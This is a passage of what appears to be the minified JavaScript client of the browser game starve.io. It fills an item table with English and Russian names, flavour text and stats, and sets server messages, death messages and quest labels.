                    We[Be.BLUE_CORD] = ["Diamond Cord", "Used in crafting Special Hats"],
                    We[Be.CHEST] = ["Chest", "Allows you to store items", "Durability: 500"],
                    We[Be.SWORD_WOOD] = ["Wood Sword", "Does that work?", "Damage: 12", "Building Damage: 4"],
                    We[Be.SWORD] = ["Stone Sword", "Be nice to others", "Damage: 19", "Building Damage: 6"],
                    We[Be.SWORD_GOLD] = ["Gold Sword", "King of the forest", "Damage: 22", "Building Damage: 7"],
                    We[Be.SWORD_DIAMOND] = ["Diamond Sword", "You can feel the power", "Damage: 24", "Building Damage: 8"],
                    We[Be.PIRATE_SWORD] = ["Pirate Sword", "Ayyyyy!", "Better range than a normal sword", "Damage: 24", "Building Damage: 8"],
                    We[Be.SWORD_AMETHYST] = ["Amethyst Sword", "Mauve is the most beautiful color of the world", "Damage: 27", "Building Damage: 9"],
                    We[Be.DRAGON_SWORD] = ["Dragon Sword", "No mercy!", "Damage: 30", "Building Damage: 10"],
                    We[Be.DRAGON_SPEAR] = ["Dragon Spear", "Kill them all!", "Damage: 22", "Building Damage: 7"],
                    We[Be.PICK_WOOD] = ["Wood Pickaxe", "Can harvest only stone and wood", "Damage: 1"],
                    We[Be.PICK] = ["Stone Pickaxe", "Can harvest wood, stone and gold", "Damage: 2"],
                    We[Be.PICK_GOLD] = ["Gold Pickaxe", "Can also harvest diamond", "Damage: 3", "Building Damage: 1"],
                    We[Be.PICK_DIAMOND] = ["Diamond Pickaxe", "Can also harvest amethyst", "Damage: 4", "Building Damage: 1"],
                    We[Be.PICK_AMETHYST] = ["Amethyst Pickaxe", "Can also harvest reidite, looks fancy!", "Damage: 5", "Building Damage: 1"],
                    We[Be.HAMMER] = ["Stone Hammer", "Useful to destroy buildings", "Doesn't work well on diamond or amethyst", "Damage: 2", "Building Damage: 20"],
                    We[Be.HAMMER_GOLD] = ["Gold Hammer", "Useful to destroy buildings", "Doesn't work well on amethyst", "Damage: 3", "Building Damage: 30"],
                    We[Be.HAMMER_DIAMOND] = ["Diamond Hammer", "Useful to destroy buildings", "Damage: 4", "Building Damage: 40"],
                    We[Be.HAMMER_AMETHYST] = ["Amethyst Hammer", "Useful to destroy buildings", "Damage: 5", "Building Damage: 50"],
                    We[Be.SUPER_HAMMER] = ["Super Hammer", "Have you planned to destroy the world?", "Damage: 12", "Building Damage: 70"],
                    We[Be.WOOD_SPEAR] = ["Wood Spear", "Like a wooden stick, but it stings.", "Damage: 10", "Building Damage: 3"],
                    We[Be.SPEAR] = ["Stone Spear", "The beginning of evolution!", "Damage: 14", "Building Damage: 4"],
                    We[Be.GOLD_SPEAR] = ["Gold Spear", "Careful, it stings!", "Damage: 15", "Buildings Damage: 5"],
                    We[Be.DIAMOND_SPEAR] = ["Diamond Spear", "You're ready to kill a dragon", "Damage: 17", "Buildings Damage: 5"],
                    We[Be.AMETHYST_SPEAR] = ["Amethyst Spear", "Dragons no longer frighten you", "Damage: 18", "Buildings Damage: 6"],
                    We[Be.SHOVEL] = ["Stone Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 2"],
                    We[Be.SHOVEL_GOLD] = ["Gold Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 3", "Buildings Damage: 1"],
                    We[Be.SHOVEL_DIAMOND] = ["Diamond Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 4", "Buildings Damage: 1"],
                    We[Be.SHOVEL_AMETHYST] = ["Amethyst Shovel", "Dig the ground to gather dirt, ice, and sand", "You can also gather minerals", "Damage: 5", "Buildings Damage: 1"],
                    We[Be.WOOD_HELMET] = ["Wood Helmet", "Better than nothing", "Players Defense: 1", "Animals Defense: 4"],
                    We[Be.STONE_HELMET] = ["Stone Helmet", "You're ready for battle!", "Players Defense: 2", "Animals Defense: 8"],
                    We[Be.GOLD_HELMET] = ["Gold Helmet", "AKA the helmet of the savages", "Players Defense: 4", "Animals Defense: 13"],
                    We[Be.DIAMOND_HELMET] = ["Diamond Helmet", "Don't brag too much", "Players Defense: 5", "Animals Defense: 19"],
                    We[Be.AMETHYST_HELMET] = ["Amethyst Helmet", "You're no longer afraid of anything", "Players Defense: 6", "Animals Defense: 23"],
                    We[Be.REIDITE_HELMET] = ["Reidite Helmet", "You no longer feel pain", "Players Defense: 7", "Animals Defense: 25"],
                    We[Be.DRAGON_HELMET] = ["Dragon Helmet", "You will conquer the world", "Players Defense: 8", "Animals Defense: 27"],
                    We[Be.EXPLORER_HAT] = ["Explorer hat", "Animals won't pay attention to you", "but don't make noises!", "Warm outside water and in winter", "You also calm down aggressive monsters twice as fast"],
                    We[Be.CHRISTMAS_HAT] = ["Christmas Hat", "Oh, oh, oh, Merry Christmas", "Warm outside water and in winter"],
                    We[Be.ELF_HAT] = ["Elf Hat", "Don't let yourself be exploited, you little snow elf!", "Warm outside water and in winter"],
                    We[Be.HOOD] = ["Hood", "You're a rogue", "You can steal someone only if", "1) It's night", "2) You're not wearing anything", "3) If you haven't been touched for eight seconds", "4) You are not close a fire", "5) Your target doesn't wear a peasant outfit", "Warm outside water and in winter"],
                    We[Be.EARMUFFS] = ["Earmuffs", "Some kind of little chapka.", "Warm outside water and in winter"],
                    We[Be.COAT] = ["Chapka", "Also called a coat.", "Warmer outside water and in winter"],
                    We[Be.CAP_SCARF] = ["Winter Scarf and Cap", "Very comfortable", "Very Warm"],
                    We[Be.FUR_HAT] = ["Mammoth fur hat", "The best blizzard protection", "Very Warm"],
                    We[Be.PEASANT] = ["Peasant", "Your plants grow faster", "Warm outside water and in winter"],
                    We[Be.WINTER_HOOD] = ["Winter Hood", "You can steal someone only if", "- It's night", "- You're not wearing anything", "- If you haven't been touched for four seconds", "- You are not close a fire", "- Your target doesn't wear a winter peasant outfit", "Warm outside water and in winter"],
                    We[Be.WINTER_PEASANT] = ["Winter Peasant", "Your plants grow faster", "Warm outside water and in winter"],
                    We[Be.DIVING_MASK] = ["Diving Mask", "You are fast in the water", "Warm in water", "Players Defense: 2, Animals Defense: 8"],
                    We[Be.SUPER_DIVING_SUIT] = ["Super Diving Mask", "You are very fast in the water", "Warm in water", "Players Defense: 4, Animals Defense: 16"],
                    We[Be.DRAGON_ORB] = ["Dragon Orb", "You feel a great power emanating from this orb"],
                    We[Be.DRAGON_HEART] = ["Dragon Heart", "Turns you into a Ghost on Death!", "You are a ghost for 60 seconds", "Find a resurrection stone"],
                    We[Be.GEMME_GREEN] = ["Green Gemstone", "You didn't cheat, promise?"],
                    We[Be.GEMME_ORANGE] = ["Orange Gemstone", "Only a real pirate can find it!"],
                    We[Be.GEMME_BLUE] = ["Blue Gemstone", "For too kind people"],
                    We[Be.CROWN_GREEN] = ["Green Crown", "You heal yourself very quickly", "Heal over time: 40", "Players Defense: 4, Animals Defense: 16"],
                    We[Be.CROWN_ORANGE] = ["Orange Crown", "You suddenly feel very lucky", "Players Defense: 4, Animals Defense: 16"],
                    We[Be.CROWN_BLUE] = ["Blue Crown", "Once you're dead, you'll become a ghost", "Though you will lose your weapon", "Players Defense: 4, Animals Defense: 16"],
                    We[Be.BUCKET_FULL] = ["Bucket", "Useful to fill a well", "One bucket is equivalent to twelve bottles"],
                    We[Be.BUCKET_EMPTY] = ["Empty Bucket", "You need to fill this bucket near a water source"],
                    We[Be.BOTTLE_FULL] = ["Bottle", "Allows you to drink water anywhere", "Water: 50"],
                    We[Be.BOTTLE_EMPTY] = ["Empty Bottle", "You can fill this bottle near a water source"],
                    We[Be.WATERING_CAN] = ["Empty Watering Can", "You must fill it with a water source to use it"],
                    We[Be.WATERING_CAN_FULL] = ["Watering Can", "Allows watering of plants", "Damage: 1"],
                    We[Be.BAG] = ["Bag", "More space for your items!"],
                    We[Be.PAPER] = ["Paper", "Used in book-crafting"],
                    We[Be.BOOK] = ["Book", "Allows to considerably reduce the time of crafting", "Must be wearing to work", "Damage: 1"],
                    We[Be.BANDAGE] = ["Bandage", "Recover more quickly your life", "Heal over time: 30", "Effect: 5"],
                    We[Be.LOCK] = ["Lock", "Allow you to lock your chest"],
                    We[Be.LOCKPICK] = ["Lock-pick", "Allows you to unlock one chest"],
                    We[Be.TOTEM] = ["Totem", "Allow you to create a team", "Share doors and chests", "Harmful building won't hurt your friend"],
                    We[Be.BRIDGE] = ["Bridge", "Very useful on water", "It allows you to drink without drowning", "Walk faster in water"],
                    We[Be.SIGN] = ["Sign", "Leave a message to others", "Durability: 200"],
                    We[Be.ROOF] = ["Roof", "Hides you a little and warms you!", "Also protects you against sand storm"],
                    We[Be.WELL] = ["Well", "Allows bottle filling", "Durability: 1000"],
                    We[Be.WALL] = ["Wood Wall", "It's just a wall", "Durability: 1000"],
                    We[Be.STONE_WALL] = ["Stone Wall", "It's a little more serious.", "Durability: 1500"],
                    We[Be.GOLD_WALL] = ["Gold Wall", "Gold on your walls? It's kind of flashy.", "Durability: 2000"],
                    We[Be.DIAMOND_WALL] = ["Diamond Wall", "So shiny, watch your eyes", "Durability: 2500"],
                    We[Be.AMETHYST_WALL] = ["Amethyst Wall", "You must be very scared to go out!", "Durability: 3500"],
                    We[Be.SPIKE] = ["Wood Spike", "Can damage your enemies", "Damage: 10, On-Hit Damage: 2", "Durability: 150"],
                    We[Be.STONE_SPIKE] = ["Stone Spike", "I wouldn't want to be your enemy.", "Damage: 20", "On-Hit Damage: 3", "Durability: 300"],
                    We[Be.GOLD_SPIKE] = ["Gold Spike", "You're so cruel.", "Damage: 30", "On-Hit Damage: 3", "Durability: 600"],
                    We[Be.DIAMOND_SPIKE] = ["Diamond Spike", "You don't like to have company.", "Damage: 40", "On-Hit Damage: 4", "Durability: 1200"],
                    We[Be.AMETHYST_SPIKE] = ["Amethyst Spike", "What the hell did your neighbors do to you?", "Damage: 50", "On-Hit Damage: 4", "Durability: 2400"],
                    We[Be.WOOD_DOOR] = ["Wood Door", "Can be opened or closed by you or your friends", "Durability: 1000"],
                    We[Be.STONE_DOOR] = ["Stone Door", "A stronger door is more serious", "Durability: 1500"],
                    We[Be.GOLD_DOOR] = ["Gold Door", 'Are you rebuilding the "el dorado?"', "Durability: 2000"],
                    We[Be.DIAMOND_DOOR] = ["Diamond Door", "For a shining house", "Durability: 2500"],
                    We[Be.AMETHYST_DOOR] = ["Amethyst Door", "Is your house a locked safe?", "Durability: 3500"],
                    We[Be.FURNACE] = ["Furnace", "Warms you up", "It consumes wood all 5 seconds", "Durability: 1000"],
                    We[Be.WINDMILL] = ["Windmill", "Can produce flour from wheat", "It takes 5 seconds to make Flour", "Returns points when working", "Durability: 2000"],
                    We[Be.BREAD_OVEN] = ["Bread Oven", "Allows bread to be made from flour", "It takes 10 seconds to make bread", "Returns points when working", "Durability: 2000"],
                    We[Be.RESURRECTION] = ["Resurrection stone", "It's magic", "Resurrect you if you're a ghost", "You will lose your weapon", "Durability: 200"],
                    We[TEXT.YOU_CANNOT_JOIN] = "You cannot join this server",
                    We[TEXT.KICKED] = "Kicked: ",
                    We[TEXT.KEY_ALREADY] = "Your key is already used by someone else",
                    We[TEXT.KEY_WRONG] = "Your key is wrong",
                    We[TEXT.OLD_VERSION] = "You have an old version, you need to clear your cache",
                    We[TEXT.NEW_VERSION] = "Your client version is too recent for this server. The server is being updated",
                    We[TEXT.WRONG_PASSWORD] = "Wrong password! To enter a password: https://starve.io/?password=...",
                    We[TEXT.NO_MORE_RESOURCES] = "There are no more new resources",
                    We[TEXT.SURVIVED_1DAY] = "You survived 1 day",
                    We[TEXT.SURVIVED] = "You survived ",
                    We[TEXT.DAYS] = " days",
                    We[TEXT.DEAD_SAD] = "You are dead ;-;",
                    We[TEXT.SPAM_ME] = "Server cannot find spawn location! Spam the play button!",
                    We[TEXT.SPAM_ME2] = "Server is full! Spam the play button!",
                    We[TEXT.EMPTY] = "Resource is empty",
                    We[TEXT.INV_FULL] = "Inventory is full (right-click to empty items)",
                    We[TEXT.DEAD] = " is dead",
                    We[TEXT.WRONG_TOOL] = "This is not the right tool",
                    We[TEXT.JOIN_TEAM] = "You joined a team",
                    We[TEXT.YOU_DEAD] = "You are dead",
                    We[TEXT.JOINED_TEAM] = " joined the team",
                    We[TEXT.TEAM_DESTROYED] = "Your team was destroyed",
                    We[TEXT.LEFT_TEAM] = "You left the team",
                    We[TEXT.LEFT_TEAM2] = " left the team",
                    We[TEXT.TOKEN] = "Someone stole your token :>",
                    We[TEXT.CHOOSE] = "Choose a server",
                    We[TEXT.PLAYERS] = "players",
                    We[TEXT.TOTAL_PLAYERS] = "total players",
                    We[TEXT.TOTAL_MODE] = "players on this mode",
                    We[TEXT.COMMING_SOON] = "Coming soon...",
                    document.getElementById("nickname_input").placeholder = "Nickname",
                    n[0] = ["You were killed for no reason"],
                    n[1] = ["You starved to death, as the name of the game implies"],
                    n[2] = ["You froze to death. So sad", "You got hypothermia. Next time, try sitting by a fire instead."],
                    n[3] = ["A player killed you whilst telling you to 'git gud.'", "You got murdered by a player. Don't worry, that player will die too, eventually."],
                    n[4] = ["You stayed too close to the fire and burnt to death. Bad idea.", "You died to a fire. Fires hurt you. Go write a story about it."],
                    n[5] = ["Your body will become a nest for spider eggs", "A spider killed you. At least it wasn't a rabbit."],
                    n[6] = ["The wolf won't starve anymore after eating you", "They aren't dogs. Wolves don't like being pet."],
                    n[7] = ["The fox was too quick for you", "The fox turned you into a box. Since when do animals have magic powers?"],
                    n[8] = ["The bear only wanted a hug.", "The bear was too much to bare. I'm not sorry."],
                    n[9] = ["You were burnt to a crisp by a dragon. So sad.", "You got flattened by a dragon. Getting squished is a horrible way to die."],
                    n[10] = ["You jumped into a spike wall. Not a good idea...", "You got killed by a spike wall. Most people are sensible enough not to touch pointy things."],
                    n[11] = ["Even the ghost can die.", "You failed to be resurrected. This is a game, so you go to life after you die, so..."],
                    n[12] = ["A bacterium from your raw food killed you. This game is definitely too hard.", "You killed the raw food. It killed you too."],
                    n[13] = ["You died of thirst. Better drink your own piss."],
                    n[14] = ["Did you know starver's mouths are always below water when swimming? Now you know."],
                    n[15] = ["Do not worry, the piranha finds you tasty.", "Fun fact: Pirahnas eat people. Including you."],
                    n[16] = ["EvelTeam does not plan that you can kill the kraken", "A kraken krak-ed your skull."],
                    n[17] = ["Your skin's falling apart, the sun killed you."],
                    n[18] = ["Garlic stored in your pockets boiled your brain."],
                    n[19] = ["As a vampire, don't stand near the garlic cloves."],
                    n[20] = ["You ate garlic as a vampire, what did you expect?"],
                    n[21] = ["Your body wraps itself in thornbushes. As you try to escape, your skin comes off and your heart stops beating."],
                    ZOMBIE_GRUMBLE = "Uuunnnggg",
                    ZOMBIE_GRUMBLES = ["Uuunnnggg... I'm starving", "Need your brain Uuunnnggg...", "Fresh meat here... Uuunnnggg", "Uuunnnggg... You are tasty", "Uuunnnggg...", "Eat... uuunnnggg...", "I can smell blood... Uuunnnggg"]
            }
            function ce() {
                We[Be.DRAGON_CUBE] = ["You feel a great power emanating from this orb"],
                    n[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."],
                    We[Be.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"],
                    We[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME",
                    We[TEXT.TWITTER] = " Share on Twitter",
                    We[TEXT.FACEBOOK] = " Share on Facebook",
                    We[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points",
                    We[TEXT.POINTS] = "points",
                    We[TEXT.SCORE] = "Score",
                    We[TEXT.KILL] = "Kill",
                    We[TEXT.DAYS_SURVIVED] = "Days survived",
                    We[TEXT.MODE_FREE] = "Building method: Free. Press G to change",
                    We[TEXT.MODE_GRID] = "Building method: Grid. Press G to change",
                    We[Be.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"],
                    We[Be.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"],
                    We[Be.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"],
                    We[Be.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"],
                    document.getElementById("typequest").innerHTML = "Chrono Quests",
                    document.getElementById("timeremainingquest").innerHTML = "Time Remaining",
                    document.getElementById("constraintquest").innerHTML = " Constraints",
                    document.getElementById("claim_rewards").innerHTML = " Claim rewards",
                    document.getElementById("rewardquest").innerHTML = " Reward",
                    document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart",
                    document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst",
                    document.getElementById("survive20min_3").innerHTML = "Survive without losing life",
                    document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests",
                    document.getElementById("dont_hit_5").innerHTML = " Be peaceful",
                    document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter",
                    document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
                for (var e = 0; e < 7; e++)
                    document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
                document.getElementById("quit_chronoquest").innerHTML = " QUIT",
                    We[Be.HAND] = ["Рука"],
                    We[Be.GROUND] = ["Земля", "Грязно!"],
                    We[Be.SAND] = ["Песок", "Он в моих глазах!"],
                    We[Be.WOOD] = ["Дерево", "Постоянно нужно больше!"],
                    We[Be.STONE] = ["Камень", "Твердый"],
                    We[Be.GOLD] = ["Золото", "Будьте щедры, давайте его другим"],
                    We[Be.DIAMOND] = ["Алмаз", "Что вы создадите с помощью него?"],
                    We[Be.AMETHYST] = ["Аметист", "Он сиреневый, как Lapa"],
                    We[Be.FLOUR] = ["Мука", "Используется в готовке"],
                    We[Be.COOKIE] = ["Печенье", "Превосходное бабушкино печенье", "Еда: 50"],
                    We[Be.CAKE] = ["Торт", "Торт мечты для гурманов", "Еда: 100"],
                    We[Be.MEAT] = ["Сырое Мясо", "Ты можешь пожарить его с помощью огня", "Вызывает отравление: 10", "Еда: 15"],
                    We[Be.COOKED_MEAT] = ["Жареное Мясо", "Превосходный стейк, пожалуйста", "Еда: 35"],
                    We[Be.FOODFISH] = ["Сырая Рыба", "Я думаю она всё ещё жива", "Вызывает отравление: 10", "Еда: 18"],
                    We[Be.FOODFISH_COOKED] = ["Жареная рыба", "С лимоном она прекрасна", "Еда: 35"],
                    We[Be.BREAD] = ["Хлеб", "Прекрасный французский хлеб", "Это валюта, используемая на рынке", "Еда: 15"],
                    We[Be.SANDWICH] = ["Бутерброд", "На вкус как Крабсбургер", "Еда: 100"],
                    We[Be.CANDY] = ["Конфеты", "Только для детей!", "Еда: 20"],
                    We[Be.SUGAR_CAN] = ["Сахарная Трость", "Попробуйте это, это вкусно", "Еда: 100"],
                    We[Be.GARLAND] = ["Гирлянда", "Прекрасная декорация для крыши"],
                    We[Be.SEED] = ["Семя Ягоды", "Вырастает в ягоды", "Рождение: 2мин", "Рост: 55сек", "Нужна вода: 3мин 20сек", "Прочность: 700", "Продолжительность: 8 дней"],
                    We[Be.PLANT] = ["Ягода", "Ягода вкусная!", "Еда: 10"],
                    We[Be.WHEAT_SEED] = ["Пшеничное Семя", "Вырастает в пшеницу", "Рождение: 2мин", "Рост: 16сек", "Нужна вода: 2мин", "Прочность: 700", "Продолжительность: 8 дней"],
                    We[Be.WILD_WHEAT] = ["Дикая Пшеница", "Перемалывается в муку, когда помещается в мельницу"],
                    We[Be.PUMPKIN_SEED] = ["Семена Тыквы", "Вырастает в тыкву", "Рождение: 2мин 40сек", "Рост: 2мин", "Нужна вода: 2мин", "Прочность: 700", "Продолжительность: 8 дней"],
                    We[Be.PUMPKIN] = ["Тыква", "Это напоминает мне Хеллоуин", "Еда: 30"],
                    We[Be.GARLIC_SEED] = ["Семена Чеснока", "Очень опасно для вампиров", "Урон: 20", "Рождение: 4мин", "Рост: 4 мин", "Нужна вода: 1мин 40сек", "Прочность: 700", "Продолжительность: 8 дней"],
                    We[Be.GARLIC] = ["Чеснок", "Лечит и снижает получаемый холод", "Еда: 14", "Лечит: 30", "Эффект: 1"],
                    We[Be.THORNBUSH_SEED] = ["Семена Колючего Куста", "Может нанести урон врагам", "Урон: 20", "Рождение: 4мин", "Рост: 15сек", "Нужна вода: 3мин", "Прочность: 1000", "Продолжительность: 8 дней"],
                    We[Be.THORNBUSH] = ["Колючий Куст", "Это больно!"],
                    We[Be.PLOT] = ["Грядка", "Серьезно, используйте это.", "С этим ГМО удобрением ваши растения", "будут расти быстрее и потребуют меньше воды", "Прочность: 2000"],
                    We[Be.ICE] = ["Лёд", "Используется для изготовления тортов и воды"],
                    We[Be.SPANNER] = ["Гаечный Ключ", "Для починки дверей, стен, колючек", "Урон: 2"],
                    We[Be.FUR_WOLF] = ["Шкура Волка", "Щенок? Но где же Щенок?!"],
                    We[Be.FUR] = ["Шкура Зайца", "Этот кролик был таким милым..."],
                    We[Be.SPECIAL_FUR] = ["Чистая Шкура", "Вы - фабрика хлеба"],
                    We[Be.SPECIAL_FUR_2] = ["Чёрная Шкура", "Вы готовы делать зло."],
                    We[Be.FUR_WINTER] = ["Зимняя Шкура", "Эти животные просто хотели обнять тебя..."],
                    We[Be.SCALES] = ["Чешуя", "Она пахнет рыбой!"],
                    We[Be.KRAKEN_SKIN] = ["Шкура Кракена", "Вы не испугались?"],
                    We[Be.FIRE] = ["Костёр", "Согрейтесь!", "Прочность: 150", "Продолжительность: 2мин"],
                    We[Be.BIG_FIRE] = ["Большой Костёр", "Согрейтесь больше!", "Прочность: 400", "Продолжительность: 6мин"],
                    We[Be.WORKBENCH] = ["Верстак", "Необходим для создания многих предметов"],
                    We[Be.CORD] = ["Нить", "Используется в изготовлении Шапок и Рюкзака"],
                    We[Be.BLUE_CORD] = ["Алмазная Нить", "Используется в изготовлении специальных шапок"],
                    We[Be.CHEST] = ["Сундук", "Позволяет хранить предметы", "Прочность: 500"],
                    We[Be.SWORD_WOOD] = ["Деревянный Меч", "Это работает?", "Урон: 12", "Урон по строениям: 4"],
                    We[Be.SWORD] = ["Каменный Меч", "Будьте добры к другим", "Урон: 19", "Урон по строениям: 6"],
                    We[Be.SWORD_GOLD] = ["Золотой Меч", "Король леса", "Урон: 22", "Урон по строениям: 7"],
                    We[Be.SWORD_DIAMOND] = ["Алмазный Меч", "Ты можешь почувствовать силу", "Урон: 24", "Урон по строениям: 8"],
                    We[Be.PIRATE_SWORD] = ["Пиратский Меч", "Aррррр!", "Дальность атаки больше чем у нормального меча", "Урон: 24", "Урон по строениям: 8"],
                    We[Be.SWORD_AMETHYST] = ["Аметистовый Меч", "Сиреневый - самый красивый цвет в мире", "Урон: 27", "Урон по строениям: 9"],
                    We[Be.DRAGON_SWORD] = ["Меч Дракона", "Без пощады!", "Урон: 30", "Урон по строениям: 10"],
                    We[Be.DRAGON_SPEAR] = ["Копьё Дракона", "Убивай всех!", "Урон: 22", "Урон по строениям: 6"],
                    We[Be.PICK_WOOD] = ["Деревянная Кирка", "Может добывать только дерево и камень", "Урон: 1"],
                    We[Be.PICK] = ["Каменная Кирка", "Может добывать дерево, камень и золото", "Урон: 2"],
                    We[Be.PICK_GOLD] = ["Золотая Кирка", "Также может добывать алмазы", "Урон: 3", "Урон по строениям: 1"],
                    We[Be.PICK_DIAMOND] = ["Алмазная Кирка", "Можно добывать всё", "Урон: 4", "Урон по строениям: 1"],
                    We[Be.PICK_AMETHYST] = ["Аметистовая Кирка", "Можно добывать всё, ещё и выглядит красиво!", "Урон: 5", "Урон по строениям: 1"],
                    We[Be.HAMMER] = ["Каменный молот", "Используется для разрушения зданий", "Плохо разрушает алмазные и аметистовые здания", "Урон: 2", "Урон по строениям: 20"],
                    We[Be.HAMMER_GOLD] = ["Золотой Молот", "Используется для разрушения зданий", "Плохо разрушает аметистовые здания", "Урон: 3", "Урон по строениям: 30"],
                    We[Be.HAMMER_DIAMOND] = ["Алмазный Молот", "Используется для разрушения зданий", "Урон: 4", "Урон по строениям: 40"],
                    We[Be.HAMMER_AMETHYST] = ["Аметистовый Молот", "Используется для разрушения зданий", "Урон: 5", "Урон по строениям: 50"],
                    We[Be.SUPER_HAMMER] = ["Супер Молот", "У вас есть планы разрушить мир?", "Урон: 12", "Урон по строениям: 70"],
                    We[Be.WOOD_SPEAR] = ["Деревянное Копьё", "Выглядит как деревянная палочка, но делает больно.", "Урон: 10", "Урон по строениям: 2"],
                    We[Be.SPEAR] = ["Каменное Копьё", "Начало эволюции!", "Урон: 14", "Урон по строениям: 4"],
                    We[Be.GOLD_SPEAR] = ["Золотое Копьё", "Осторожно, это больно!", "Урон: 15", "Урон по строениям: 5"],
                    We[Be.DIAMOND_SPEAR] = ["Алмазное Копьё", "Вы готовы убивать дракона.", "Урон: 17", "Урон по строениям: 5"],
                    We[Be.AMETHYST_SPEAR] = ["Аметистовое Копьё", "Драконы больше не пугают вас", "Урон: 18", "Урон по строениям: 6"],
                    We[Be.SHOVEL] = ["Каменная Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 2"],
                    We[Be.SHOVEL_GOLD] = ["Золотая Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 3", "Урон по строениям: 1"],
                    We[Be.SHOVEL_DIAMOND] = ["Алмазная Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 4", "Урон по строениям: 1"],
                    We[Be.SHOVEL_AMETHYST] = ["Аметистовая Лопата", "Копайте землю, чтобы получить грязь, лед и песок", "Так же вы можете получить ресурсы", "Урон: 5", "Урон по стреониям: 1"],
                    We[Be.WOOD_HELMET] = ["Деревянный Шлем", "Лучше чем ничего", "Защита от игроков: 1", "Защита от животных: 4"],
                    We[Be.STONE_HELMET] = ["Каменный Шлем", "Вы готовы к битве!", "Защита от игроков: 2", "Защита от животных: 8"],
                    We[Be.GOLD_HELMET] = ["Золотой Шлем", "Также известен как шлем жестоких людей", "Защита от игроков: 4", "Защита от животных: 13"],
                    We[Be.DIAMOND_HELMET] = ["Алмазный Шлем", "Не слишком хвастайтесь", "Защита от игроков: 5", "Защита от животных: 19"],
                    We[Be.AMETHYST_HELMET] = ["Аметистовый Шлем", "Ты больше ничего не боишься", "Защита от игроков: 6", "Защита от животных: 23"],
                    We[Be.DRAGON_HELMET] = ["Шлем Дракона", "Ты покоришь мир", "Защита от игроков: 8", "Защита от животных: 27"],
                    We[Be.EXPLORER_HAT] = ["Шапка Исследователя", "Животные не обращают на вас внимания", "но не шумите!", "Защищает от холода вне воды."],
                    We[Be.CHRISTMAS_HAT] = ["Рождественская Шапка", "Ох-хо-хо, Счастливого Рождества", "Защищает от холода вне воды."],
                    We[Be.ELF_HAT] = ["Шапка Эльфа", "Не позволяйте себе эксплуатироваться, ведь вы маленький снежный эльф!", "Защищает от холода вне воды."],
                    We[Be.HOOD] = ["Капюшон", "Вы разбойник", "Вы можете украсть что-то, если", "1) Ночь", "2) Вы ничего не носите", "3)Если вас не тронули в течение восьми секунд", "4) Вы не рядом с огнём", "5) Вы не можете ничего украсть у крестьянской туники", "Защищает от холода вне воды."],
                    We[Be.EARMUFFS] = ["Теплые Наушники", "Какая-то маленькая шапка.", "Защищает от холода вне воды."],
                    We[Be.COAT] = ["Шапка", "Так же называется пальтом.", "Защищает от холода вне воды."],
                    We[Be.CAP_SCARF] = ["Зимний Шарф и Шапка", "Очень комфортно", "Очень тепло"],
                    We[Be.PEASANT] = ["Крестьянская Туника", "Ваши растения растут быстрее", "Защищает от холода вне воды."],
                    We[Be.WINTER_HOOD] = ["Зимний Капюшон", "Вы можете украсть что-то, если", "- Ночь", "- Вы ничего не носите", "- Если вас не тронули в течение четырёх секунд", "- Вы не рядом с огнём", "- Вы не можете ничего украсть у крестьянской туники", "Защищает от холода вне воды."],
                    We[Be.WINTER_PEASANT] = ["Зимняя Крестьянская Туника", "Ваши растения растут быстрее", "Защищает от холода вне воды."],
                    We[Be.DIVING_MASK] = ["Акваланг", "Вы быстрее передвигаетесь по воде", "Тепло в воде", "Защита от игроков: 2, Защита от животных: 8"],
                    We[Be.SUPER_DIVING_SUIT] = ["Супер Акваланг", "Вы очень быстро передвигаетесь по воде", "Тепло в воде", "Защита от игроков: 4, Защита от животных: 16"],
                    We[Be.DRAGON_ORB] = ["Шар Дракона", "Даётся за квест"],
                    We[Be.DRAGON_HEART] = ["Сердце Дракона", "Превращает вас в призрака после смерти!", "Вы призрак на 60 секунд", "Найдите камень воскрешения"],
                    We[Be.GEMME_GREEN] = ["Зелёный Драгоценный Камень", "Вы без читов, правильно?"],
                    We[Be.GEMME_ORANGE] = ["Оранжевый Драгоценный Камень", "Только настоящий пират найдёт это!"],
                    We[Be.GEMME_BLUE] = ["Синий Драгоценный Камень", "Для очень добрых людей"],
                    We[Be.CROWN_GREEN] = ["Зеленая корона", "Вы лечите себя очень быстро", "Лечит: 40", "Защита от игроков: 4, Защита от животных: 16"],
                    We[Be.CROWN_ORANGE] = ["Оранжевая Корона", "Вам очень повезло", "Защита от игроков: 4, Защита от животных: 16"],
                    We[Be.CROWN_BLUE] = ["Синяя Корона", "Как только вы умрёте, вы станете призраком", "Но вы потеряете своё оружие", "Защита от игроков: 4, Защита от животных: 16"],
                    We[Be.BUCKET_FULL] = ["Ведро", "Используется для заполнения колодца", "Одно ведро равняется двенадцати бутылкам"],
                    We[Be.BUCKET_EMPTY] = ["Пустое ведро", "Вам надо заполнить это ведро возле воды"],
                    We[Be.BOTTLE_FULL] = ["Бутылка", "Позволяет пить воду в любом месте", "Вода: 50"],
                    We[Be.BOTTLE_EMPTY] = ["Пустая бутылка", "Вы можете заполнить бутылку возле воды"],
